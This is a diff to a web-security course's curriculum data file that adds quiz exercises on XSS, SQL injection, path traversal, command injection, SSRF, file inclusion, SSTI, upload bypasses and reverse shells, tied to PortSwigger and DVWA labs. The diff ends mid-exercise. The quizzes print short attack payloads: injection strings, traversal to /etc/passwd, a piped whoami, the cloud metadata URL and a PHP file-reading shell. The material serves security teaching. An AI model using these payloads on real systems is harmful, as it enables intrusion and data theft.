+            "type": "match",
+            "prompt": "Match each spray concept to its role.",
+            "pairs": [
+              {
+                "left": "Sniper",
+                "right": "Single marked payload position"
+              },
+              {
+                "left": "Simple list",
+                "right": "The payload set type (wordlist)"
+              },
+              {
+                "left": "Grep-Match 'Welcome'",
+                "right": "Flags the successful login"
+              },
+              {
+                "left": "Response length 3250",
+                "right": "The odd-one-out signalling a hit"
+              }
+            ],
+            "explanation": "A different response length or a matched grep string flags the valid credential, just as length 3250 exposed the valid user Atlas."
+          }
+        ],
         moduleId: "m8",
         number: 108,
         title: "Lab: Burp Intruder - password spray on DVWA",
@@ -15463,6 +19361,45 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m9-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each 2021 OWASP Top 10 code to its risk category.",
+            "pairs": [
+              {
+                "left": "A01",
+                "right": "Broken Access Control"
+              },
+              {
+                "left": "A02",
+                "right": "Cryptographic Failures"
+              },
+              {
+                "left": "A03",
+                "right": "Injection"
+              },
+              {
+                "left": "A10",
+                "right": "Server-Side Request Forgery (SSRF)"
+              }
+            ],
+            "explanation": "The 2021 list is ranked by prevalence and impact: Broken Access Control rose to #1 (A01), while SSRF was added as A10."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the facts about what the OWASP Top 10 is.",
+            "template": "The OWASP Top 10 is a free consensus awareness standard, refreshed about every ___ years, and the current edition is ___.",
+            "blanks": [
+              "4",
+              "2021"
+            ],
+            "explanation": "OWASP publishes the list roughly every four years; 2021 is the current edition and the one this module targets.",
+            "distractors": [
+              "2",
+              "2017"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 109,
         title: "OWASP Top 10 Overview & Significance",
@@ -15762,6 +19699,38 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each XSS flavour to where its untrusted data comes from.",
+            "pairs": [
+              {
+                "left": "Reflected",
+                "right": "Payload rides in the current request; victim must click a crafted link"
+              },
+              {
+                "left": "Stored",
+                "right": "Payload saved server-side and fires for every later visitor"
+              },
+              {
+                "left": "DOM-based",
+                "right": "Client-side JS reads location.search and writes it unencoded"
+              }
+            ],
+            "explanation": "All three run attacker JavaScript in the victim's session; they differ only in the source and lifetime of the untrusted data."
+          },
+          {
+            "type": "order",
+            "prompt": "Put the steps for finding and confirming a reflected XSS in order.",
+            "items": [
+              "Map every reflected input on the page",
+              "Submit a unique marker like zzxss123",
+              "Read the response source to learn the context",
+              "Send a context-appropriate payload"
+            ],
+            "explanation": "Learning the reflection context (HTML body, attribute, script, URL) first lets you pick a payload that actually breaks out and executes."
+          }
+        ],
         moduleId: "m9",
         number: 110,
         title: "XSS - Reflected, Stored, DOM-based (theory + impact + payloads)",
@@ -16034,6 +20003,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-3",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each manual SQL injection variant to its signature technique.",
+            "pairs": [
+              {
+                "left": "WHERE-clause bypass",
+                "right": "' OR 1=1--"
+              },
+              {
+                "left": "UNION-based",
+                "right": "' UNION SELECT null, username, password FROM users--"
+              },
+              {
+                "left": "Boolean-blind",
+                "right": "AND '1'='1 vs '1'='2"
+              },
+              {
+                "left": "Time-based blind",
+                "right": "WAITFOR DELAY '00:00:05'"
+              }
+            ],
+            "explanation": "Each variant extracts data differently: inline (UNION), always-true logic (OR 1=1), or inference from a true/false difference or a timed delay."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the sqlmap command that enumerates databases non-interactively.",
+            "template": "sqlmap -u \"https://site/product?category=Gifts\" ___ --dbs",
+            "blanks": [
+              "--batch"
+            ],
+            "explanation": "--batch tells sqlmap to accept all default answers so it runs without prompting; --dbs lists the databases.",
+            "distractors": [
+              "--auto",
+              "--yes"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 111,
         title: "SQL Injection - Manual & Using sqlmap",
@@ -16292,6 +20299,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each broken-access-control flavour to its definition.",
+            "pairs": [
+              {
+                "left": "IDOR",
+                "right": "App trusts a request ID and returns data you don't own"
+              },
+              {
+                "left": "Horizontal escalation",
+                "right": "Reaching another user's data at your own privilege level"
+              },
+              {
+                "left": "Vertical escalation",
+                "right": "Gaining a higher privilege level than your account"
+              },
+              {
+                "left": "Forced browsing",
+                "right": "Reaching an unlinked but unprotected privileged page"
+              }
+            ],
+            "explanation": "All stem from missing the authorization check: confirming you may act on THIS object or endpoint, not just that you are logged in."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the forced-browsing finding from the real lab.",
+            "template": "GET /robots.txt leaks Disallow: /___, which you browse to directly and delete Carlos without ever being admin.",
+            "blanks": [
+              "administrator-panel"
+            ],
+            "explanation": "The admin page was merely unlinked, not access-controlled, so robots.txt disclosed its path and it could be used directly.",
+            "distractors": [
+              "admin",
+              "wp-admin"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 112,
         title: "Broken Access Control - IDOR, Forced Browsing, Privilege Escalation",
@@ -16517,6 +20562,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-5",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the classic path traversal payload that reads the Unix password file.",
+            "template": "Change the filename parameter to ___ to climb to root and read the Unix password file.",
+            "blanks": [
+              "../../../etc/passwd"
+            ],
+            "explanation": "Each ../ climbs one directory; enough of them reach the filesystem root, and /etc/passwd then returns a response starting root:x:0:0.",
+            "distractors": [
+              "/etc/passwd",
+              "..\\..\\..\\windows\\win.ini"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each path-traversal bypass or confirmation to its token.",
+            "pairs": [
+              {
+                "left": "URL encoding",
+                "right": "%2e%2e%2f"
+              },
+              {
+                "left": "Double encoding",
+                "right": "%252e%252e%252f"
+              },
+              {
+                "left": "Unix traversal confirmed",
+                "right": "Response begins root:x:0:0"
+              },
+              {
+                "left": "Windows target confirmed",
+                "right": "win.ini returns [fonts]"
+              }
+            ],
+            "explanation": "Encoding the ../ sequence defeats naive filters; the response bodies (root:x:0:0 or [fonts]) prove the file was actually read."
+          }
+        ],
         moduleId: "m9",
         number: 113,
         title: "Path Traversal / Directory Traversal",
@@ -16744,6 +20827,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each shell chaining operator to its behaviour.",
+            "pairs": [
+              {
+                "left": ";",
+                "right": "Run the next command sequentially regardless of result"
+              },
+              {
+                "left": "&&",
+                "right": "Run the next command only if the prior one succeeded"
+              },
+              {
+                "left": "||",
+                "right": "Run the next command only if the prior one failed"
+              },
+              {
+                "left": "|",
+                "right": "Pipe the prior command's output into the next"
+              }
+            ],
+            "explanation": "These shell metacharacters turn injected input into extra commands; knowing their logic lets you chain exactly what you need (CWE-78)."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the PortSwigger stock-checker command injection payload.",
+            "template": "Set storeID to 1___whoami so the real command's output is piped into whoami.",
+            "blanks": [
+              "|"
+            ],
+            "explanation": "The pipe sends stdout of the intended command into whoami, and the response returns the web server's running user, proving RCE.",
+            "distractors": [
+              ";",
+              "&&"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 114,
         title: "Command Injection (OS injection, ; && | operators)",
@@ -17000,6 +21121,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of a CSRF attack against a weakly protected action.",
+            "items": [
+              "Identify a state-changing action with fully predictable parameters",
+              "Confirm the app relies on cookie-based sessions",
+              "Host a page with a hidden auto-submitting form",
+              "Victim loads the page and the request fires with their cookies"
+            ],
+            "explanation": "The browser auto-attaches the victim's session cookies, so loading the attacker's page silently performs the action as the victim."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the real CSRF token bypass from the lab.",
+            "template": "The app validated its CSRF token only on POST, so changing the request method to ___ skipped the token check entirely.",
+            "blanks": [
+              "GET"
+            ],
+            "explanation": "Because validation was tied to one HTTP method, converting the request to GET in Burp Repeater bypassed the token check.",
+            "distractors": [
+              "PUT",
+              "HEAD"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 115,
         title: "CSRF (Cross-Site Request Forgery)",
@@ -17217,6 +21364,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each PortSwigger XSS lab to the breakout payload it requires.",
+            "pairs": [
+              {
+                "left": "Reflected",
+                "right": "<script>alert(1)</script>"
+              },
+              {
+                "left": "Stored",
+                "right": "<script>alert(document.cookie)</script>"
+              },
+              {
+                "left": "DOM-based",
+                "right": "\"><img src=x onerror=alert('XSS_doomed')>"
+              }
+            ],
+            "explanation": "Each payload fits its sink: reflected and stored land in HTML body, while the DOM lab needs to break out of an img src attribute first."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the vulnerable DOM-based sink's data source.",
+            "template": "The sink document.write(...) is fed the query read straight from ___ with no encoding.",
+            "blanks": [
+              "location.search"
+            ],
+            "explanation": "The search term comes from location.search (the ?search= parameter) and is written into an img src with no encoding, enabling the onerror handler.",
+            "distractors": [
+              "document.cookie",
+              "location.hash"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 116,
         title: "PortSwigger: XSS Labs - 3 labs (Reflected, Stored, DOM)",
@@ -17365,6 +21546,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps for solving the blind SQL injection lab.",
+            "items": [
+              "Confirm the injection with TrackingId=xyz' AND '1'='1 vs '1'='2",
+              "Confirm the user with (SELECT 'a' FROM users WHERE username='administrator')='a",
+              "Set up Burp Intruder with a Grep-Match on 'Welcome back'",
+              "Brute-force SUBSTRING(password,N,1) one character at a time"
+            ],
+            "explanation": "With no visible data, the true/false 'Welcome back' difference is the oracle Intruder uses to read the password character by character."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the WHERE-clause SQL injection lab payload.",
+            "template": "category=Gifts' OR ___-- turns WHERE category='Gifts' AND released=1 into an always-true condition.",
+            "blanks": [
+              "1=1"
+            ],
+            "explanation": "OR 1=1 makes the whole condition true for every row, and the trailing -- comments out the released=1 filter so unreleased products appear.",
+            "distractors": [
+              "1=2",
+              "0=1"
+            ]
+          }
+        ],
         moduleId: "m9",
         number: 117,
         title:
@@ -17532,6 +21739,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-10",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the IDOR lab request change.",
+            "template": "Change GET /download-transcript/2.txt to /download-transcript/___ to retrieve Carlos's transcript with his plaintext password.",
+            "blanks": [
+              "1.txt"
+            ],
+            "explanation": "The server trusts the filename in the request without checking ownership, so a different sequential ID returns another user's transcript.",
+            "distractors": [
+              "0.txt",
+              "admin.txt"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each broken-access-control lab to its key detail.",
+            "pairs": [
+              {
+                "left": "IDOR lab",
+                "right": "Swap the transcript number to read another user's file"
+              },
+              {
+                "left": "Forced-browsing lab",
+                "right": "robots.txt discloses the unprotected /administrator-panel"
+              },
+              {
+                "left": "Shared root cause",
+                "right": "Server trusts a client-supplied identifier or path"
+              }
+            ],
+            "explanation": "Both labs fail to verify that the requesting session is authorized for the resource, whether it is referenced by ID or by hidden path."
+          }
+        ],
         moduleId: "m9",
         number: 118,
         title:
@@ -17657,6 +21898,37 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m9-11",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the DVWA difficulty levels by how hard the vulnerability is to exploit.",
+            "items": [
+              "Low: little to no filtering, direct payloads work as-is",
+              "Medium/High: partial filtering, needs case or encoding tricks",
+              "Impossible: parameterised queries and encoding block exploitation"
+            ],
+            "explanation": "Raising the difficulty adds progressively stronger mitigations, culminating in Impossible where proper defences remove the bug entirely."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each DVWA difficulty level to its mitigation.",
+            "pairs": [
+              {
+                "left": "Low",
+                "right": "Little to no filtering"
+              },
+              {
+                "left": "Medium/High",
+                "right": "Partial filtering or encoding"
+              },
+              {
+                "left": "Impossible",
+                "right": "Parameterised queries and output encoding"
+              }
+            ],
+            "explanation": "Comparing levels shows exactly which defence defeats each technique, and why parameterised queries at Impossible stop SQLi dead."
+          }
+        ],
         moduleId: "m9",
         number: 119,
         title: "DVWA: Complete SQLi & XSS all difficulty levels",
@@ -17828,6 +22100,44 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m10-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each SSRF flavour to how you confirm or exploit it.",
+            "pairs": [
+              {
+                "left": "In-band SSRF",
+                "right": "Fetched content is returned to you in the response"
+              },
+              {
+                "left": "Blind SSRF",
+                "right": "Nothing reflected; confirm via out-of-band callback or timing"
+              },
+              {
+                "left": "Cloud-metadata SSRF",
+                "right": "Steal IAM credentials from 169.254.169.254"
+              },
+              {
+                "left": "Server-itself target",
+                "right": "Reach http://127.0.0.1 over the loopback interface"
+              }
+            ],
+            "explanation": "SSRF comes in in-band, blind, and cloud-metadata forms; the metadata variant against 169.254.169.254 is what drove the 2019 Capital One breach."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the EC2 metadata URL that leaks IAM role credentials.",
+            "template": "http://___/latest/meta-data/",
+            "blanks": [
+              "169.254.169.254"
+            ],
+            "explanation": "169.254.169.254 is the link-local cloud metadata address; reaching it via SSRF exposes temporary EC2 IAM credentials.",
+            "distractors": [
+              "127.0.0.1",
+              "10.0.0.1"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 120,
         title: "SSRF - Server-Side Request Forgery (basics, blind SSRF, AWS metadata)",
@@ -18036,6 +22346,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each file-inclusion term to its meaning.",
+            "pairs": [
+              {
+                "left": "Path traversal",
+                "right": "Climb directories upward with ../ sequences"
+              },
+              {
+                "left": "LFI",
+                "right": "Read or run a file already on the server"
+              },
+              {
+                "left": "RFI",
+                "right": "Include an attacker-hosted URL for direct RCE"
+              },
+              {
+                "left": "php://filter",
+                "right": "Wrapper that leaks raw source code"
+              }
+            ],
+            "explanation": "All inclusion bugs share one root cause - unsanitized input chooses the file - but differ in whether the file is local, remote, or read through a PHP wrapper."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill the traversal payload that reads the Linux accounts file.",
+            "template": "?file=../../../../___",
+            "blanks": [
+              "etc/passwd"
+            ],
+            "explanation": "Each ../ climbs one directory; enough of them reach the filesystem root, and /etc/passwd returns the list of Linux accounts as proof of LFI.",
+            "distractors": [
+              "windows/system32",
+              "var/log/auth.log"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 121,
         title: "File Inclusion - LFI & RFI (path traversal, null byte, wrappers)",
@@ -18277,6 +22625,38 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to detect and exploit a server-side template injection.",
+            "items": [
+              "Inject {{7*7}} and check the page returns 49",
+              "Fingerprint the engine with the polyglot payload",
+              "Build the engine-specific RCE payload",
+              "Execute an OS command on the server"
+            ],
+            "explanation": "A math probe proves code execution, the polyglot identifies the engine, and the engine-specific syntax escalates SSTI to remote code execution."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each template engine to its evaluation syntax.",
+            "pairs": [
+              {
+                "left": "Jinja2",
+                "right": "{{7*7}}"
+              },
+              {
+                "left": "Freemarker",
+                "right": "${7*7}"
+              },
+              {
+                "left": "ERB (Ruby)",
+                "right": "<%= 7*7 %>"
+              }
+            ],
+            "explanation": "Syntax differs per engine, so one probe does not fire everywhere; Jinja2/Twig use {{ }}, Java engines use ${ }, and ERB uses <%= %>."
+          }
+        ],
         moduleId: "m10",
         number: 122,
         title: "SSTI - Server-Side Template Injection (Jinja2, Twig, Freemarker)",
@@ -18442,6 +22822,46 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the PortSwigger web-shell-via-path-traversal upload chain.",
+            "items": [
+              "Upload a PHP web shell through the avatar endpoint",
+              "Observe the file won't execute from the upload folder",
+              "Rename it to ..%2fshell.php to break out one directory",
+              "Request the file directly to run it"
+            ],
+            "explanation": "The upload lands in a non-executable folder, so a path-traversal rename drops the shell one directory out where PHP does execute."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each upload-filter bypass to an example of it.",
+            "pairs": [
+              {
+                "left": "Case obfuscation",
+                "right": "exploit.pHp"
+              },
+              {
+                "left": "Null-byte injection",
+                "right": "exploit.php%00.jpg"
+              },
+              {
+                "left": "MIME-type spoof",
+                "right": "Content-Type: image/jpeg on PHP body"
+              },
+              {
+                "left": "Magic-byte spoof",
+                "right": "GIF89a prefix before PHP code"
+              },
+              {
+                "left": "Double extension",
+                "right": "shell.php.jpg"
+              }
+            ],
+            "explanation": "Filename, extension, and declared type are all attacker-controlled labels; each bypass defeats a check that trusts a label instead of the file's real content."
+          }
+        ],
         moduleId: "m10",
         number: 123,
         title: "File Upload Attacks (extension bypass, MIME type, magic bytes)",
@@ -18683,6 +23103,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each business-logic flaw to how it is abused.",
+            "pairs": [
+              {
+                "left": "Price manipulation",
+                "right": "Client-supplied price is trusted instead of looked up"
+              },
+              {
+                "left": "Auth bypass via client state",
+                "right": "Client sets user_role to admin"
+              },
+              {
+                "left": "Workflow bypass",
+                "right": "Add items for free delivery, then remove before payment"
+              },
+              {
+                "left": "IDOR-adjacent access",
+                "right": "Swap a resource ID to read another user's object"
+              }
+            ],
+            "explanation": "Each is a well-formed request the app's own rules should have forbidden; the defence is re-deriving price, privilege, and ownership server-side."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the CWE class for business logic vulnerabilities.",
+            "template": "Business logic flaws are classified under CWE-___ (Business Logic Errors).",
+            "blanks": [
+              "840"
+            ],
+            "explanation": "CWE-840 covers Business Logic Errors, which need dedicated manual review because scanners and WAFs essentially never find them.",
+            "distractors": [
+              "918",
+              "200"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 124,
         title: "Business Logic Vulnerabilities (price manipulation, workflow bypass)",
@@ -18925,6 +23383,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-6",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the CVE that a leaked Apache Struts version maps to.",
+            "template": "A verbose stack trace disclosing the Apache Struts version maps straight to CVE-___ .",
+            "blanks": [
+              "2017-5638"
+            ],
+            "explanation": "CVE-2017-5638 is the Apache Struts flaw that a leaked version reveals - the same bug that was the entry point for the 2017 Equifax breach.",
+            "distractors": [
+              "2021-44228",
+              "2014-0160"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each information-disclosure flavour to a concrete example.",
+            "pairs": [
+              {
+                "left": "Directory listing enabled",
+                "right": "/logs/ browsable with no index file"
+              },
+              {
+                "left": "Forgotten backup file",
+                "right": "wp-config.php.old"
+              },
+              {
+                "left": "Version header",
+                "right": "Server: Apache/2.4.49"
+              },
+              {
+                "left": "Verbose error",
+                "right": "Raw stack trace returned to the browser"
+              }
+            ],
+            "explanation": "Information disclosure (CWE-200) is usually recon fuel: leaked versions, backups, and listings feed a targeted follow-up attack."
+          }
+        ],
         moduleId: "m10",
         number: 125,
         title: "Information Disclosure (stack traces, backup files, source code)",
@@ -19124,6 +23620,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cryptographic failure mode to its correct fix.",
+            "pairs": [
+              {
+                "left": "Weak password storage",
+                "right": "Salted bcrypt, scrypt, or Argon2"
+              },
+              {
+                "left": "Insecure transmission",
+                "right": "Enforce TLS 1.2+ with HSTS"
+              },
+              {
+                "left": "Poor key management",
+                "right": "Keys in a KMS/secrets manager with rotation"
+              },
+              {
+                "left": "Fast unsalted MD5/SHA1",
+                "right": "Falls to rainbow tables and fast cracking"
+              }
+            ],
+            "explanation": "OWASP A02 groups weak storage, insecure transport, and poor key management; each has a standard fix - slow salted hashing, enforced modern TLS, and managed keys."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the third recommended slow, salted password-hashing algorithm.",
+            "template": "Replace fast unsalted MD5 with a slow salted hash such as bcrypt, scrypt, or ___ .",
+            "blanks": [
+              "Argon2"
+            ],
+            "explanation": "A deliberately slow, per-user-salted algorithm like Argon2 (CWE-916 fix) defeats both rainbow tables and high-speed guessing.",
+            "distractors": [
+              "SHA-256",
+              "Base64"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 126,
         title: "Cryptographic Failures - OWASP A02 (weak ciphers, key reuse)",
@@ -19293,6 +23827,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each API security issue to how it manifests.",
+            "pairs": [
+              {
+                "left": "BOLA",
+                "right": "Swap an object ID to read another user's data"
+              },
+              {
+                "left": "Mass assignment",
+                "right": "Add role:admin to the JSON body to escalate"
+              },
+              {
+                "left": "Hidden spec exposure",
+                "right": "/openapi.json lists endpoints the UI never shows"
+              },
+              {
+                "left": "Parameter pollution",
+                "right": "?category=public&category=private"
+              }
+            ],
+            "explanation": "APIs widen the attack surface because the client controls a structured body and the object IDs in the path; fixes are ownership checks and allow-list binding."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the classic web bug that BOLA is the API version of.",
+            "template": "BOLA (Broken Object Level Authorization) is the API version of ___ .",
+            "blanks": [
+              "IDOR"
+            ],
+            "explanation": "BOLA is IDOR for APIs: GET /api/orders/1002 returns someone else's order because the server never checks that you own the object.",
+            "distractors": [
+              "CSRF",
+              "XSS"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 127,
         title: "OWASP API Security Top 10 (BOLA, broken auth, mass assignment)",
@@ -19549,6 +24121,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-9",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each LLM attack-surface term to its meaning.",
+            "pairs": [
+              {
+                "left": "Prompt injection",
+                "right": "Attacker input overrides the developer's instructions"
+              },
+              {
+                "left": "Indirect prompt injection",
+                "right": "Malicious instructions hide in content the model reads"
+              },
+              {
+                "left": "Excessive agency",
+                "right": "Tool-enabled model performs a harmful action just because asked"
+              },
+              {
+                "left": "LLM01",
+                "right": "OWASP LLM Top 10 entry for Prompt Injection"
+              }
+            ],
+            "explanation": "An LLM wired to tools is a trusted intermediary, the same trust failure as SSRF; these risks map to the OWASP LLM Top 10."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the OWASP LLM Top 10 identifier for Excessive Agency.",
+            "template": "Excessive Agency is tracked as OWASP LLM Top 10 entry LLM___ .",
+            "blanks": [
+              "06"
+            ],
+            "explanation": "LLM01 is Prompt Injection, LLM05 Improper Output Handling, and LLM06 Excessive Agency - the harm of a tool-enabled model acting just because it was asked.",
+            "distractors": [
+              "01",
+              "05"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 128,
         title: "LLM/AI Attack Surface (Prompt Injection, OWASP LLM Top 10 intro)",
@@ -19729,6 +24339,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to solve the basic PortSwigger SSRF lab.",
+            "items": [
+              "Intercept the stock-check request containing the stockApi parameter",
+              "Replace the stockApi URL with http://localhost/admin",
+              "Find the delete-user control on the internal admin panel",
+              "Request http://localhost/admin/delete?username=carlos"
+            ],
+            "explanation": "The stockApi feature fetches a URL you control, so pointing it at the loopback admin panel exposes internal endpoints you then invoke to delete the user."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the username deleted to solve the lab.",
+            "template": "http://localhost/admin/delete?username=___",
+            "blanks": [
+              "carlos"
+            ],
+            "explanation": "Reaching the internal admin panel via SSRF lets you call its delete endpoint against carlos to solve the lab.",
+            "distractors": [
+              "wiener",
+              "administrator"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 129,
         title: "PortSwigger: SSRF Labs",
@@ -19876,6 +24512,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-11",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the target file for the DVWA LFI traversal.",
+            "template": "?page=../../../../___",
+            "blanks": [
+              "etc/passwd"
+            ],
+            "explanation": "Manipulating the page parameter with enough ../ sequences reaches /etc/passwd, proving local file inclusion in DVWA.",
+            "distractors": [
+              "etc/shadow",
+              "boot.ini"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each DVWA file-inclusion concept to its detail.",
+            "pairs": [
+              {
+                "left": "LFI",
+                "right": "../ traversal in page parameter to /etc/passwd"
+              },
+              {
+                "left": "RFI",
+                "right": "Full URL to an attacker-hosted PHP payload"
+              },
+              {
+                "left": "allow_url_include",
+                "right": "Server setting RFI requires"
+              },
+              {
+                "left": "page parameter",
+                "right": "The vulnerable input you manipulate"
+              }
+            ],
+            "explanation": "LFI reads a local file via traversal while RFI pulls attacker PHP from a URL - the latter only works when allow_url_include is enabled server-side."
+          }
+        ],
         moduleId: "m10",
         number: 130,
         title: "DVWA: LFI/RFI exercises",
@@ -20004,6 +24678,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-12",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Burp Repeater steps for the file-upload path-traversal lab.",
+            "items": [
+              "Upload the PHP payload via POST /my-account/avatar",
+              "In Repeater, change filename to ../any-name.php",
+              "URL-encode the slash so it reads ..%2fany-name.php",
+              "GET /files/any-name.php to retrieve the secret"
+            ],
+            "explanation": "Encoding the slash as %2f makes the rename break out of /files/avatar/ to /files/, where the PHP executes and returns carlos's secret."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the PHP function in the uploaded web-shell payload.",
+            "template": "<?php echo ___('/home/carlos/secret'); ?>",
+            "blanks": [
+              "file_get_contents"
+            ],
+            "explanation": "file_get_contents reads the protected file's contents, which the executed shell then returns in its response to solve the lab.",
+            "distractors": [
+              "system",
+              "include"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 131,
         title: "PortSwigger: File Upload Labs",
@@ -20212,6 +24912,31 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-13",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to exploit the PortSwigger SSTI challenge.",
+            "items": [
+              "Fuzz the input to identify the engine from its error behaviour",
+              "Confirm evaluation with a math-expression payload",
+              "Escalate to command execution with engine-specific RCE syntax"
+            ],
+            "explanation": "You first fingerprint the engine from how it errors, prove it evaluates input with a math probe, then use its own syntax to run OS commands."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the probe that confirms template evaluation by returning 49.",
+            "template": "Inject ___ and confirm the page returns 49 instead of the literal text.",
+            "blanks": [
+              "{{7*7}}"
+            ],
+            "explanation": "If {{7*7}} renders as 49, the engine is evaluating your input as code, confirming server-side template injection.",
+            "distractors": [
+              "${7*7}",
+              "7*7"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 132,
         title: "PortSwigger: SSTI Challenge",
@@ -20346,6 +25071,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m10-14",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to solve the PortSwigger price-tampering lab.",
+            "items": [
+              "Attempt a purchase that fails for insufficient funds",
+              "Intercept the add-to-cart request",
+              "Modify the price parameter to an arbitrary lower value",
+              "Complete checkout at the tampered price"
+            ],
+            "explanation": "The add-to-cart request trusts a client-supplied price, so lowering it before checkout lets you buy the item below its real cost."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the request parameter you tamper with to lower the cost.",
+            "template": "Intercept the add-to-cart request and modify the ___ parameter to an arbitrary lower value.",
+            "blanks": [
+              "price"
+            ],
+            "explanation": "Because the server trusts the client-supplied price instead of looking it up, changing it directly lets checkout proceed at your chosen amount.",
+            "distractors": [
+              "quantity",
+              "itemId"
+            ]
+          }
+        ],
         moduleId: "m10",
         number: 133,
         title: "PortSwigger: Business Logic Vulnerabilities Labs",
@@ -20491,6 +25242,42 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m11-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each shell concept to its correct description.",
+            "pairs": [
+              {
+                "left": "Reverse shell",
+                "right": "Target connects back to the attacker's listener"
+              },
+              {
+                "left": "Bind shell",
+                "right": "Target listens on a port; attacker connects in"
+              },
+              {
+                "left": "Reverse shell detection",
+                "right": "Lower risk - blends with outbound traffic"
+              },
+              {
+                "left": "Bind shell detection",
+                "right": "Higher risk - open port visible to scans"
+              }
+            ],
+            "explanation": "Reverse shells ride outbound connections that most firewalls allow, while bind shells expose a listening port that scanning and inbound firewall rules can catch."
+          },
+          {
+            "type": "order",
+            "prompt": "Put the reverse shell flow in the correct order.",
+            "items": [
+              "Attacker starts a listener",
+              "Target executes the reverse shell command",
+              "Target connects back to the attacker",
+              "Attacker gains interactive control"
+            ],
